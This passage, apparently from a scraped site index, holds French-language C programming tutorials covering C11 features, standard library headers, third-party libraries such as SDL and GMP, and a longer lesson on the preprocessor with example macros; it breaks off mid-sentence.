\"%p\") #define print(x) printf(printf_dec_format(x), x) #define printnl(x) printf(printf_dec_format(x), x), puts(\"\") Pour aller plus loin, je vous encourage à lire cet article en anglais qui présente de façon complète ce nouveau système de macros génériques. Le mot-clef _Noreturn Ce mot-clef se met pour préciser qu'une fonction ne retourne rien. Cela peut sembler bête à nos yeux puisque void sert déjà à indiquer que la fonction ne retourne aucune valeur. En fait, ce mot-clef servira au compilateur qui pourra optimiser le code ; sans lui, certaines optimisations sont impossibles. _Noreturn void foobar (); Vous trouverez de la documentation sur ce mot-clef sur open-std.org . Améliorations des complexes Pour faciliter la création de nombres complexes, C11 offre trois macros très simples d'utilisation : CMPLXF pour utiliser des parties réelles et imaginaires de type float , CMPLX pour double et CMPLXL pour long double . double _Complex z = CMPLX ( 3 , - 2 ); Vous pouvez en apprendre un peu plus sur le site d'IBM . Finalement, le C n'est pas le vieux langage des années 1970, c'est un langage qui évolue encore aujourd'hui et qui propose des améliorations intéressantes. Malheureusement, vu le recul du C par rapport à d'autres langages dans les applications grand public, ces normes ne sont supportées complètement ou partiellement par peu de compilateur. Si vous voulez utiliser une des fonctionnalités proposée par C99 ou C11, veillez à vérifier que votre compilateur la supporte. Enfin, pour conclure, je vous donne une liste de quelques liens qui abordent ces normes de façon plus complète que nous ; en effet, certaines améliorations demandent des connaissances que vous n'avez pas acquises dans ce tutoriel, il aurait donc été inutile de les présenter ici. Les nouveautés du C99 C's New Ease of Use C11: A New C Standard Aiming at Safer Programming Des bibliothèques par milliers Nous avons vu une petite partie de la bibliothèque standard durant ce cours. Non seulement nous n'avons pas tout vu, mais sachez qu'il existe en plus des milliers de bibliothèques dites tierces , c'est-à-dire des bibliothèques qui se rajoutent par-dessus la bibliothèque standard. Il en existe une quantité indénombrable qui permettent de tout faire ou presque. Toutes les montrer serait impossible et surtout inutile, donc nous en avons choisis quelques unes des plus connues. Nous ne ferons que les présenter ; si vous voulez les utiliser, il faudra apprendre par vous-mêmes en lisant la documentation, ou si vous avez de la chance, d'autres tutoriels. Le reste de la bibliothèque standard La bibliothèque standard que propose le langage C est toute petite comparée à certains langages comme Java, et pourtant, nous sommes loin d'en avoir fait le tour. Ce petit sous-chapitre a pour but de vous montrer quelques-uns des fichiers d'en-têtes les plus utilisés en C. Sachez néanmoins que même en limitant le nombre de fichiers que nous allons montrer, il n'est pas possible d'être exhaustif. Voilà pourquoi je vous encourage à continuer vos recherches sur la bibliothèque standard par vous mêmes par la suite. Wikipédia et cplusplus.com sont de bons départs. <assert.h> - Intercepter les erreurs de programmation Ce fichier d'en-tête est tout simple : il ne contient qu'une seule macro : assert , qui signifie assertion. Qu'est ce qu'une assertion ? C'est une évaluation d'une condition qui, si jamais elle se révèle fausse, quitte le programme. Cela permet d'intercepter les erreurs de programmation mais pas les erreurs d'utilisation ou d'exécution. Voilà pourquoi les assertions ne sont utiles que lors des phases de test et sont désactivées lorsque cette phase est terminée. Pour l'utiliser en C, il suffit de faire assert(condition) : si celle-ci est vraie, alors le programme continue normalement ; si elle est fausse, on affiche un message comme celui ci-dessous. Assertion failed: expression, file f, line x Voici un exemple de code en apparence correct mais qui comporte un problème (exemple tiré du site de Emmanuel Delahaye) : il affiche une valeur en trop. #include <stdio.h> static void afficher ( int const t [], size_t n ) { size_t i ; for ( i = 0 ; i <= n ; i ++ ) { printf ( \"%d\" , t [ i ]); } puts ( \"\" ); } int main ( void ) { int tab [] = { 1 , 2 , 3 , 4 }; afficher ( tab , sizeof ( tab ) / sizeof ( * tab )); return 0 ; } 1 2 3 4 2 On décide donc de tester la validité de l'itérateur grâce à notre macro. static void afficher (int const t[], size_t n) { size_t i; for (i = 0; i <= n; i++) { assert(i < n); printf (\"%d\", t[i]); } puts(\"\"); } 1 2 3 4 Assertion failed: i < n, file main.c, line 10 This application has requested the Runtime to terminate it in an unusual way. Please contact the application's support team for more information. Press ENTER to continue. On se rend compte que l'itérateur a dépassé la taille maximale du tableau ; on comprend donc qu'il faut remplacer i <= n par i < n . En exécutant de nouveau le programme, l'affichage sera cette fois correct. Une fois que l'on a fini de tester le programme et qu'on veut le distribuer, on doit désactiver toutes les assertions. Et au lieu de tout supprimer à la main, nous avons un moyen très simple : il suffit de définir la macro NDEBUG . En effet, si cette macro est définie, alors les assertions ne feront absolument rien. Et si jamais un problème est découvert, il suffit de supprimer cette macro pour réactiver les assertions. <ctype.h> - Test sur les caractères Cet en-tête définit tout un tas de macros permettant de savoir si le caractère à tester est un chiffre, une lettre, s'il est considéré comme un caractère imprimable, etc. Il fournit également deux macros permettant de convertir une minuscule en majuscule et vice-versa. Chaque macro fait appel à une fonction qui prend un caractère en paramètre et renvoie 0 si la condition testée et fausse, une autre valeur si elle est vraie. En voici la liste avec une brève explication. isalnum : teste si le caractère est un chiffre, une majuscule ou une minuscule. isalpha : teste si le caractère est une lettre de l'alphabet latin. iscntrl : teste si le caractère est un caractère dit de contrôle , c'est à dire l'inverse d'un caractère dit imprimable . Parmi eux, on compte le retour à la ligne et la tabulation. isdigit : teste si le caractère est un chiffre. isgraph : teste si le caractère a une représentation graphique. Tous les caractères imprimables en ont une à l'exception de l'espace. islower : teste si on a affaire à une minuscule. isprint : teste si un caractère est imprimable. ispunct : teste si le caractère est un signe de ponctuation. isspace : teste si le caractère est un white-space character , à savoir ' ' , '\\t' , '\\n' , '\\v' , '\\f' ou '\\r' . isupper : teste si on a affaire à un majuscule. isxdigit : teste si le caractère est un chiffre hexadécimal, c'est à dire s'il fait partie de cette liste : 0 1 2 3 4 5 6 7 8 9 a b c d e f A B C D E F . tolower : convertit une lettre majuscule en minuscule ; ne fait rien si déjà en minuscule. toupper : convertit une lettre minuscule en majuscule ; ne fait rien si déjà en majuscule. <limits.h> - Connaître les limites des types entiers Nous le savons, les types entiers ont une taille minimale et une taille maximale pour les valeurs qu'ils peuvent prendre. Nous le savons aussi, ces limites dépendent de l'implémentation. Ce fichier d'en-tête sert donc à fournir à tous les utilisateurs une liste de macros pour connaître les limites de chaque type, même si en interne les valeurs changent en fonction de l'environnement. <float.h> - Limites des flottants et de ce qui les concerne Cet en-tête donne les limites des types flottants, mais en plus de tout ce qui se rapporte à eux : la mantisse, l'exposant, l'arrondi utilisé, etc. Très utile pour une gestion poussée des flottants, surtout avec C99. <stddef.h> - Définition d'alias Ce fichier d'en-tête contient la définition de size_t et de ptrdiff_t . Nous connaissons le premier mais pas le second. C'est un alias qui permet de représenter la différence de deux pointeurs. Vous aurez sans doute moins l'occasion de l'utiliser que size_t mais il est utile de le connaître. Ce fichier est en tout cas très utile quand vous n'avez besoin de rien d'autre que ces deux alias. <stdint.h> - Définitions d'entiers spéciaux et leurs limites (C99) Il arrive que l'on veuille un entier qui fasse précisément 8 bits ou 32 bits par exemple. Comment faire puisque la taille d'un type peut varier selon l'implémentation ? C'est ce que propose ce fichier d'en-tête avec les intx_t (où x vaut 8, 16, 32 ou 64) et leur pendant non-signé uintx_t . Mais ce n'est pas tout. Il nous propose également un type intmax_t (ainsi que uintmax_t ) qui est le plus grand entier que le système propose, ainsi qu'un type intptr_t ( uintptr_t ) qui permet de représenter une adresse ; on peut convertir une adresse void* en une adresse intptr_t et vice-versa sans perte. Ce fichier contient également les limites de tous ces types, ainsi que celles d'autres types comme size_t ou ptrdiff_t par exemple. Les bibliothèques tierces Les bibliothèques pour 2D SDL - Simple DirectMedia Layer La SDL est une bibliothèque multimédia employée pour créer des applications multimédias comme des émulateurs, des jeux vidéos 2D ou des lecteurs audio par exemple. Elle peut même être utilisé conjointement avec une bibliothèque 3D. Elle permet un accès de bas niveau à l'audio, au clavier, à la souris, au joystick, à la gestion du temps et bien d'autres choses encore. Elle est portable sur de très nombreux systèmes différents. Elle est gratuite et libre d'utilisation et de modification de par sa licence GNU LGPL version 2 . Voici une capture d'écran du jeu Mini Slug Project par joe78 . SFML - Simple and Fast Multimedia Library La SFML est une bibliothèque graphique originalement développée en C++ mais utilisable en C en autres. Elle fournit elle aussi l'accélération matérielle. Elle diffère de la SDL en ce qu'elle est divisée en modules : Système, Fenêtre, Graphique, Son et Réseau. Son plus grand avantage est qu'elle est développée par un français et donc possède une documentation dans la langue de Molière ainsi que de nombreux tutoriels. Ci-dessous, un exemple de jeu réalisable avec la SFML. Les bibliothèques pour la 3D OpenGL - Open Graphics Library OpenGL est une bibliothèque multimédia qui permet de développer des applications aussi bien en 2D qu'en 3D. Elle est portable, libre et gratuite. OpenGL est la version libre de l'avant-dernière version de GL (si par exemple GL en est à la version 2.3, OpenGL en est à la version 2.2). Cette bibliothèque permet de tirer profit de l'accélération 3D des cartes graphiques. OpenGL est une bibliothèque bas-niveau qui ne traite que des rendus graphiques et ne gère pas les animations, le temps, les fenêtres, etc. C'est pour cette raison que OpenGL est utilisé conjointement avec une autre bibliothèque, comme la SDL, qui sert à créer une fenêtre dans laquelle OpenGL va travailler, à recevoir des entrées clavier, etc. Il faut quelques connaissances en mathématiques pour l'utiliser (pour les matrices par exemple). Certains jeux connus utilisent OpenGL, comme Xonotic ou encore le fameux Quake 3 . DirectX DirectX est une collection de bibliothèques destinée au multi-média et particulièrement aux jeux vidéos. Elle est développée par Microsoft, elle ne marche donc que sur Windows et Xbox. DirectX permet de gérer non seulement la 3D, mais aussi la 2D, les entrées (clavier, souris, joysticks), le réseau, le son, les vidéos et bien d'autres choses. C'est la bibliothèque favorite de beaucoup de studios, et c'est l'une des raisons pour laquelle la majorité des jeux vidéos commercialisés ne sont jouables que sous Windows. Il faut cependant faire attention aux différentes versions de DirectX, les toutes dernières n'étant plus supportées par les systèmes les plus anciens : DirectX 10 n'est supportée que par Vista et Seven. Les bibliothèques pour le son FMOD est une bibliothèque très puissante de gestion du son, utilisée par de très nombreux jeux commerciaux. Plus de 10 systèmes d'exploitations sont supportés, de Windows à GNU/Linux, en passant par la Wii et la PS3. FMOD est gratuite pour une utilisation personnelle et non commerciale. Si l'envie vous prend de vendre un logiciel qui utilise FMOD, vous devrez dépenser quelques milliers de dollars. Bibliothèques pour faire des applications graphiques API Windows L' API Windows est conçue pour les langages de programmation C et C++ et est la manière privilégiée pour une application d'interagir avec les systèmes d'exploitation Windows. Une API , comme son nom l'indique, est une interface de programmation : elle contient un ensemble de fonctions bas niveau permettant de programmer des applications haut niveau. Elle permet d'interagir avec Windows de manière poussée : récupération des informations sur le système (version, nombre de processeurs, taille de la RAM, etc), création de fenêtres et d'utilitaires (pratique car les programmes ainsi créés ressembleront aux autres programmes Windows), accès au shell, aux services réseaux, etc. Il existe plusieurs version de cette bibliothèque : Win16 était la première API pour les versions 16-bits du système. Win32 est la version 32-bits de l' API pour les systèmes plus récents. Win32s est une extension de Win32 pour les systèmes Windows 3.x qui a été introduite comme sous-ensemble de Win32. Le \"s\" est pour sous-ensemble ( subset en anglais). Win32 pour les éditions 64 bits précédemment appelée Win64 est la version pour les ordinateurs 64-bits, avec les versions Windows XP Professional x64 Edition pour les processeurs x86-64 ainsi que Windows XP 64-bit Edition et Windows Server 2003 pour les processeurs Itanium. Cette version apporte juste le support pour ces deux nouvelles plateformes. Xlib La bibliothèque Xlib réalise l'interfaçage entre le protocole X et les applications X. Elle contient des fonctions de bas niveau pour interagir avec un serveur X. Peu d'applications utilisent la Xlib directement ; en général, elles exploitent d'autres bibliothèques qui reposent sur la Xlib pour fournir des éléments d'une interface graphique. En utilisant Xlib, nous pouvons gérer les tâches suivantes : la gestion des fenêtres ; le texte : fontes, tailles, styles, etc ; le graphisme : fonctions de dessin 2D ; la couleur ; les communications avec le serveur ; la gestion des évènements et des erreurs (coupures réseau, etc ...) ; et bien d'autres choses encore. X11 ou simplement X est un environnement graphique de type « fenêtré » qui gère l'interaction homme-machine par l'écran, la souris et le clavier de certains ordinateurs en réseau. Les célèbres bibliothèques GTK et Qt sont basées sur X. Gtk+ GTK+ est une bibliothèques permettant de réaliser des interfaces graphiques. Cette bibliothèque a été développée originellement pour les besoins du logiciel de traitement d'images The GIMP. GTK+ est maintenant utilisé dans de nombreux projets, dont les environnements de bureau GNOME, Xfce et ROX. GTK+ est un projet libre (licence GNU LGPL 2.1), gratuit et multiplate-forme. Autres bibliothèques GMP GMP est une bibliothèque de calcul précis sur des très grands nombres comme $4242&#94;{6014}$, le tout rapidement. Les principaux domaines d'applications de GMP sont la recherche et les applications en cryptographie, les logiciels applicatifs de sécurité pour Internet et les systèmes de calcul formel. Par exemple, le célèbre chiffrement RSA utilise la bibliothèque GMP afin de gérer de grands nombres. GMP est notamment utilisée dans le logiciel de calcul formel Maple à partir de la version 9 et Mathematica depuis la version 5. Au cours de votre route, vous croiserez des centaines de bibliothèques différentes. Vous n'aurez pas toujours le luxe d'avoir un tutoriel dessus, il faudra donc se reposer sur la documentation et éventuellement les ressources Internet. Nous avons essayé de vous inculquer ce réflexe tout au long de ce tutoriel et nous vous encourageons d'ailleurs à continuer vos recherches pour approfondir vos connaissances sur la bibliothèque standard. Vous serez d'ailleurs étonnés qu'au fil des ans on continue toujours à découvrir, voire rédécouvrir, de nouvelles choses sur le C ou sa bibliothèque standard. Comme quoi, le C ne finira jamais de surprendre ! Sachez qu'il vous reste encore beaucoup à apprendre sur le C ; en fait, personne ne peut se vanter de maîtriser complètement le C. N'hésitez donc pas à poursuivre vos recherches, approfondir ce que nous avons vu, mais également découvrir d'autres surprises que le C vous cache encore ! Ainsi s'achève ce tutoriel, mais pas votre parcours dans le monde de la programmation. En effet, même si vous avez appris certaines choses, vous ne connaissez pas tout : le C est un langage fabuleux qui réserve bien des surprises. Pour continuer votre apprentissage, je vous donne quelques conseils ci-dessous. Soyez curieux : fouillez sur Internet pour découvrir de nouvelles méthodes, approfondissez celles que vous connaissez, renseignez-vous, testez de nouveaux outils, etc. Codez et lisez du code : entrainez-vous, c'est le seul moyen de progresser. Faites des projets qui vous tiennent à cœur, implémentez des algorithmes connus, faites des exercices, des défis et exercez-vous . Pensez aussi à visiter les forums et à lire le code des autres, découvrez comment ils procèdent, apprenez d'eux de nouvelles techniques ou façon de faire, progressez en suivant leurs conseils. Cherchez toujours à en savoir plus : la programmation est un monde merveilleux où l'on en apprend un peu plus chaque jour, sans jamais s'arrêter. Lisez des tutoriels pour découvrir de nouveaux points. Lisez des codes pour découvrir de nouvelles façons de faire. Expérimentez. Et surtout le plus important, amusez-vous ! Remerciements Avant de conclure, les auteurs aimeraient remercier plusieurs personnes : Pouet_forever et SofEvans pour le soutien apporté à la rédaction dans les débuts ; toute l'équipe de PDP ; tous ceux qui au fil du temps et de la rédaction nous ont apporté leurs avis, leurs conseils, leurs points de vue et qui nous ont aidé à faire de ce tutoriel ce qu'il est aujourd'hui ; et surtout vous, lecteurs ! Bon courage dans votre apprentissage, car la route est infinie mais pleine de satisfactions !"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/le-preprocesseur","title":"Le préprocesseur","text":"Ce tutoriel a été rédigé par Pouet_forever pour le feu « Site du zéro ». Bonjour à tous, Lors de votre apprentissage du C, vous n'avez sans doute eu qu'un petit aperçu de ce qu'est le préprocesseur, mais il y a encore beaucoup de choses à apprendre ! Toutefois, ce que je vais vous montrer n'est pas indispensable, mais c'est toujours mieux de savoir ce que c'est quand on en rencontre. Vous allez voir que pour créer des macros il faut réfléchir un peu avant de faire n'importe quoi, parce que pour débugger ce n'est pas aussi facile qu'avec des fonctions. Pour bien comprendre ce tutoriel il faut avoir compris et être un minimum à l'aise avec le préprocesseur. Je ne reparlerai pas des #include , #ifdef , #else , #elif et #endif . #define, defined, #undef #define Les macros sur plusieurs lignes defined #undef Le # et le L'opérateur # L'opérateur ## Utilisation des opérateurs # et ## dans la même expression. Petit exercice #line, #error, #pragma #line #error #pragma Les macros qui en appellent d'autres et les macros à nombre variable d'arguments Une macro qui en appelle une autre Les macros à nombre variable d'arguments Les X-macros Exercice #define, defined, #undef #define Je ne vais pas trop m'étaler sur cette directive car vous l'avez probablement déjà appréhendée. Pour résumer, cette dernière sert à définir un nom ou une macro. La macro suivante définit un nom sans aucun paramètre : #define DEBUG La macro suivante définit un nom et associe une valeur à ce nom : #define NOIR 0x00000000 Une macro peut être redéfinie autre part dans le programme à la seule condition que celle-ci soit exactement pareille, seul quelques espaces peuvent être rajoutés. Exemple : /* Incorrect */ #define N 1 #define N 2 /* Correct */ #define N 1 #define N 1 La macro suivante contient 1 paramètre et retourne la valeur absolue de ce paramètre : #define MY_ABS(x) (((x) < 0) ? -(x) : (x)) Notez que les parenthèses sont très importantes dans les macros dues à la priorité des opérateurs. Certaines peuvent être omises, d'autres non. Pour être sûr de ne pas avoir de mauvaise surprise je vous conseille d'abuser des parenthèses pour ne laisser aucune ambiguïté possible ! Il faut faire très attention aux effets de bords. Une macro appelée normalement ne pose pas de problèmes, mais on aurait aussi pu appeler notre macro comme ça MY_ABS(a++) . Cette expression évalue 2 fois (a++) , ce qui est gênant. Mettre des parenthèses limite déjà certains effets de bords, mais c'est à l'utilisateur de faire attention à ce qu'il fait ! Vous pouvez créer des macros qui portent le même nom qu'une fonction déjà existante. Cependant, il faut bien différencier l'appel de la fonction de celle de la macro, sinon c'est uniquement la macro qui est prise en compte et pas la fonction. Pour utiliser la macro il faut l'appeler comme on le ferait normalement, par contre pour la fonction il faut entourer le nom de parenthèses. Certains puristes diront qu'il faut aussi déclarer votre fonction avec des parenthèses pour ne pas interférer avec les macros. #include <stdio.h> #include <stdlib.h> #define puts(s) printf(\"Macro : %s\\n\", (s)) int main ( void ) { char s [] = \"Salut :-)\" ; puts ( s ); /* Macro */ ( puts )( s ); /* Fonction */ return EXIT_SUCCESS ; } Les macros sur plusieurs lignes Les macros peuvent être définies sur plusieurs lignes, pour ça il faut terminer la ligne par un antislash ( \\ ) et avoir un retour à la ligne juste après. Un antislash non suivit d'un retour la la ligne termine la macro et tout ce qui suit n'est pas compris dedans. Il est important de noter qu'aucune macro ne peut contenir de directives commençant par # (y compris la directive nulle). Dès que le préprocesseur rencontre un antislash suivit d'un retour à la ligne il supprime ces 2 là pour en faire une seule ligne. Voilà pourquoi l'utilisation d'autres directives à l'intérieur d'une macro est incorrect. On peut parfois retrouver cette utilisation pour les chaînes de caractères. Une chaîne de caractère longue peut être « coupée » par l'antislash + retour à la ligne et être terminée sur la ligne d'après. Voilà un exemple de ce qu'il faut pas faire : #define MAJEUR(age) \\ #if (age >= 18) \\ ... Un petit exemple pour montrer comment agit le préprocesseur : #define M() 3 + \\ 2 + 1; int main ( void ) { char s [] = \"Bonjour a tous ! Vous etes bien sur PdP\\ mais comme cette chaine est trop longue je la met sur plusieurs\\ lignes. Evitez tout de meme d'utiliser ca, c'est pas tres propre !\" ; M () return 0 ; } int main ( void ) { char s [] = \"Bonjour a tous ! Vous etes bien sur PdP mais comme cette chaine est trop longue je la met sur plusieurs lignes. Evitez tout de meme d'utiliser ca, c'est pas tres propre !\" ; 3 + 2 + 1 ; return 0 ; } Il faut faire attention tout de même aux macros faites sur plusieurs lignes. Le piège étant de mettre une suite d'instruction et d'appeler cette macro dans un if sans accolades, par exemple. Un exemple vaut mieux qu'un long discours : #include <stdio.h> #include <stdlib.h> #define M(a) \\ if ((a) < 0) \\ printf(\"Inferieur a 0\\n\"); \\ if ((a) > 0) \\ printf(\"Superieur a 0\\n\"); \\ if ((a) == 0) \\ printf(\"Egal a 0\"); int main ( void ) { int a = 5 ; if ( a < 0 ) M ( a ) else printf ( \"Autre instruction\" ); return EXIT_SUCCESS ; } Ce code bidon et anodin n'affichera pas « Autre instruction » mais « Superieur a 0 Autre instruction ». Pour palier ce problème, une astuce assez courante est d'utiliser la boucle do { ... } while(0); qui permet de regrouper les instructions et éventuellement, d'obliger le programmeur à mettre un point virgule après l'appel de la macro. Pour que le code du dessus soit correct, on aurait dû écrire : #include <stdio.h> #include <stdlib.h> #define M(a) \\ do { \\ if ((a) < 0) \\ printf(\"Inferieur a 0\\n\"); \\ if ((a) > 0) \\ printf(\"Superieur a 0\\n\"); \\ if ((a) == 0) \\ printf(\"Egal a 0\"); \\ } while (0) int main ( void ) { int a = 5 ; if ( a < 0 ) M ( a ) else printf ( \"Autre instruction\" ); return EXIT_SUCCESS ; } On peut aussi n'utiliser que les accolades, mais l'utilisation de la boucle sert à bien montrer au programmeur qu'il s'agit d'un bloc d'instructions. defined L'opérateur defined agit au même titre que #ifdef : il vérifie si la macro existe ; il est remplacé par 1 si elle existe, par 0 le cas échéant. Avec #if ou #ifdef on ne peut tester qu'un seul paramètre à la fois, avec l'utilisation de defined on va pouvoir en tester plusieurs. L'utilisation se fait avec ou sans parenthèses. Exemple pour l'implémentation sur différents systèmes d'exploitation : #if defined __APPLE__ || defined linux # include <unistd.h> #elif defined ( WIN32 ) || defined ( WIN64 ) # include <windows.h> #endif Vous trouverez une liste des différentes constantes définies en fonction de l'implémentation en allant sur ce lien . #undef Le #undef fait exactement l'inverse de ce que fait #define . Il supprime ce qui a été défini auparavant ! Utilisation très simple : #undef X Où X est le nom à supprimer. Notez que, au lieu de placer des #define un peu partout pour faire des tests (par exemple le #ifdef DEBUG qu'on retrouve souvent), il est possible de définir une macro à l'aide de l'option -D de votre compilateur (ou /D pour Visual C++ ). Avec l'exemple du DEBUG cité précédemment, on obtient par exemple gcc -DDEBUG main.c qui aura pour effet d'ajouter la ligne #define DEBUG au début de chaque fichier compilé. Si vous êtes sous Unixoïdes (GNU/Linux, *BSD, Solaris, Mac OS, etc), l'option -E de vote compilateur vous permet d'obtenir votre fichier après son traitement par le préprocesseur. Le # et le L'opérateur # Vous avez déjà dû le rencontrer plus d'une fois celui-là dans les déclarations telles que #define , #if , #else etc. Maintenant je vais vous montrer une autre manière de l'utiliser. :p On va commencer par la plus simple : la directive nulle ! C'est tout simplement le # sans rien derrière (éventuellement des espaces/tabulations ou commentaires). On s'en sert généralement pour « lier » différentes directives. Ce que j'entends par « lier » c'est en quelque sorte faire un « bloc » de directives. Un exemple vaut mieux qu'un long discours : #if defined ( __APPLE__ ) # /* Si on est sur du matériel APPLE on inclut */ # /* <unistd.h> et tout le reste pour les sockets */ # include <unistd.h> # include <sys/socket.h> # include <sys/types.h> # include <arpa/inet.h> #elif defined ( linux ) # /* Si on est sur Linux on inclut ... la même chose */ # include <unistd.h> # include <sys/socket.h> # include <sys/types.h> # include <arpa/inet.h> #else # /* Sinon on est sous Windows */ # include <windows.h> # include <winsock2.h> #endif Il ne peut en aucun cas être placé dans une macro . Maintenant le plus intéressant ! L'opérateur # suivi d'un nom remplace automatiquement ce nom en chaîne de caractères. Petit exemple : #define AFFICHE_INT(x) printf( #x \" = %d\\n\", (x) ); Comme vous pouvez le remarquer j'ai placé #x au début du printf , ce qui aura pour effet de transformer l'argument x en chaîne de caractère. Les espaces contenus entre le # et le paramètre sont ignorés ( #a est équivalent à # a ). Un petit exemple pour illustrer tout ça : #include <stdio.h> #include <stdlib.h> #define AFFICHE_INT(x) printf( #x \" = %d\\n\", (x) ); int main ( void ) { int a = 5 , b = 6 ; AFFICHE_INT ( a ) AFFICHE_INT ( b ) AFFICHE_INT ( a + b ) return EXIT_SUCCESS ; } #include <stdio.h> #include <stdlib.h> int main ( void ) { int a = 5 , b = 6 ; printf ( \"a\" \" = %d \\n \" , a ); printf ( \"b\" \" = %d \\n \" , b ); printf ( \"a + b\" \" = %d \\n \" , a + b ); return EXIT_SUCCESS ; } Ce qui nous donne en sortie : a = 5 b = 6 a + b = 11 L'opérateur ## L'opérateur ## concatène l'argument de gauche avec celui de droite tout en restant « macro ». Les espaces contenus entre les différents arguments sont ignorés ( A ## B est égal à A##B ). Comme la résultante reste un argument « macro », il faut que celle-ci soit définie auparavant pour être utilisée à bon escient. Si elle n'est pas définie au moment de l'appel, le compilateur nous indiquera une erreur. Exemple : #define AFFICHE_INT(x, y) printf( #x #y \" = %d\\n\", x##y ); Dans ce cas-là si on appelle notre macro comme ça : AFFICHE_INT(a, b) , elle sera remplacée par : printf( \"a\" \"b\" \" = %d \", ab ); . Il faut donc que l'argument ab soit défini avant l'appel de la macro. Notez que j'ai mis « avant l'appel » et pas « avant la déclaration », ce qui signifie que AFFICHE_INT peut être défini sans que ab ne soit connu. ab peut être soit défini par le préprocesseur ( #define ) ou alors comme une simple variable. #include <stdio.h> #include <stdlib.h> #define AFFICHE_INT(x, y) printf( #x #y \" = %d\\n\", x##y ); #define ab 5 int main ( void ) { int a = 5 , b = 6 ; int ba = 10 ; AFFICHE_INT ( a , b ) /* Affiche `ab' défini par le préprocesseur */ AFFICHE_INT ( b , a ) /* Affiche la variable `ba' */ return EXIT_SUCCESS ; } Ce code nous affichera : ab = 5 ba = 10 Utilisation des opérateurs # et ## dans la même expression. Si vous avez fait des tests en essayant d'utiliser à la fois # et ## vous aurez remarqué que le compilateur apprécie modérément. De ce fait, pour pouvoir utiliser ces 2 opérateurs en même temps, il va falloir faire plusieurs macros afin de la créer. Un exemple pour montrer comment concaténer 2 chaînes de caractères : #include <stdio.h> #include <stdlib.h> #define CREER_CHAINE(chaine) #chaine #define TMP(chaine) CREER_CHAINE(chaine) #define CONCAT_CHAINE(chaine1, chaine2) TMP(chaine1 ## chaine2) int main ( void ) { printf ( \"%s\" , CONCAT_CHAINE ( Hello \\ n , Ca va ? )); return EXIT_SUCCESS ; } Comme je vous l'ai dit pour pouvoir utiliser les 2 opérateurs, il faut faire plusieurs macros. C'est en fait pour « isoler » chaque paramètre afin que la macro qui contient un # ou ## ne « voit » pas le # ou ## de l'autre. Petit exercice Écrivez une macro PRINT qui prend 2 paramètres. Le premier est le type de l'élément à afficher et le second est l'expression à afficher. Le « prototype » est celui-là : #define PRINT(type, expr) . Exemple d'utilisation : PRINT ( int , 1 + 3 ); PRINT ( double , 4.0 * atan ( 1.0 )); PRINT ( char , 'c' ); Dois nous retourner : 1+3 = 4 4.0 * atan(1.0) = 3.141593 'c' = c Indice : Il faut définir, à partir du type, le formateur approprié. On peut définir une macro du type : #define PRINT_(type) PRINT_##type . Il faut ensuite définir les différents types qui seront utilisés ( PRINT_int , PRINT_double , PRINT_char ) et leur associer le formateur adéquat. Correction : Á partir de l'indice on peut arriver à ce résultat-là : #include <stdio.h> #include <stdlib.h> #include <math.h> #define PRINT_(type) PRINT_##type #define PRINT_int \"%d\" #define PRINT_double \"%f\" #define PRINT_char \"%c\" #define PRINT(type, expr) printf(#expr \" = \" PRINT_(type) \"\\n\", expr) int main ( void ) { PRINT ( int , 1 + 3 ); PRINT ( double , 4.0 * atan ( 1.0 )); PRINT ( char , 'c' ); return EXIT_SUCCESS ; } #line, #error, #pragma #line Cette directive est assez intéressante. Elle permet de définir le numéro de ligne en cours, ainsi que le nom de fichier. Vous pouvez définir le numéro de ligne en cours en spécifiant tout simplement le numéro de ligne souhaité. Par exemple si votre fichier s'appelle main.c et vous voulez le redéfinir en test.c vous pouvez. :D Son utilisation est la suivante : #line ligne [\"nom du fichier\"] Notez que renommer le fichier est facultatif. Cette directive ne renomme pas le fichier, elle ne fait qu'interpréter le fichier en tant que . #include <stdio.h> #include <stdlib.h> int main ( void ) { printf ( \"Ligne : %5d \\t Fichier : %s \\n \" , __LINE__ , __FILE__ ); #line 300 printf ( \"Ligne : %5d \\t Fichier : %s \\n \" , __LINE__ , __FILE__ ); #line 55 \"test.c\" printf ( \"Ligne : %5d \\t Fichier : %s \\n \" , __LINE__ , __FILE__ ); return EXIT_SUCCESS ; } La sortie donne : Ligne : 45 Fichier : main.c Ligne : 300 Fichier : main.c Ligne : 55 Fichier : test.c #error Cette directive sert tout simplement à mettre une erreur. Attention, il faut la mettre avec des #if ou #ifdef sinon ça ne compilera tout simplement pas (bah oui ça met une erreur :D). Mon interprétation préférée est celle-là : #ifdef __cplusplus #error Compilez en C ... #endif Si vous avez une erreur quand vous compilez ce code c'est que vous compilez en C++ et pas en C. :D #pragma La directive #pragma est spécifique à chaque compilateur. Elle indique au compilateur de prendre en compte certains paramètres. Toute directive #pragma qui n'est pas reconnue est tout simplement ignorée. Un exemple de directive : #pragma pack(1) . Cette directive permet de forcer l'alignement mémoire tous les octets. C'est-à-dire que par défaut quand on crée une structure comme ça : struct non_alignee_s { char a ; int b ; }; Si vous faites un sizeof de cette structure il apparaîtra qu'elle occupe 8 octets en mémoire ! (considérant qu'un int fait 4 octets). Avec la directive décrite plus haut vous aurez 5. Les valeurs de cette directive sont : 1, 2, 4. Comme dit plus haut chaque directive est propre à son compilateur. De ce fait la directive #pragma pack(1) ne fonctionnera peut-être pas chez vous . Un exemple de non-portabilité : sous GCC on peut utiliser la directive #pragma unused( ma_variable ) pour ne pas avoir de warning sur la variable non utilisée spécifiée. Sous Xcode (Mac et GCC) on peut utiliser la directive #pragma mark XXX qui sert à structurer l'arborescence de son code pour une recherche plus facile et plus rapide (très utile !). Sous Visual C++ on peut linker les bibliothèques avec la directive #pragma comment( lib, \"emapi\" ) . Pour plus d'infos vous pouvez aller ici pragmas pour GCC , et là pragmas pour Visual C++ . Les macros qui en appellent d'autres et les macros à nombre variable d'arguments Une macro qui en appelle une autre Une macro peut en appeler une autre, ça vous le savez. Mais une macro peut prendre en paramètre le nom d'une autre pour l'appeler. Par exemple, j'ai une macro MIN , une autre MAX et une dernière EVALUE . Cette dernière prend 3 paramètres : le nom de la macro à appeler et deux variables. Voilà comment ce groupe se compose : #define MIN(x, y) (((x) < (y)) ? (x) : (y)) #define MAX(x, y) (((x) > (y)) ? (x) : (y)) /* Je préfère mettre l'underscore '_' plutôt que `macro', mais vous faîtes comme vous voulez. * Par la suite je mettrai _ . */ #define EVALUE(macro, x, y) macro(x, y) Si je veux calculer le minimum de 2 nombres, il suffit que j'appelle ma macro EVALUE comme ça : EVALUE(MIN, 5, 3) . Les macros à nombre variable d'arguments Tout comme une fonction, une macro peut recevoir un nombre variable d'argument. Oui, mais la macro « finale » doit avoir une nombre fini d'arguments. La 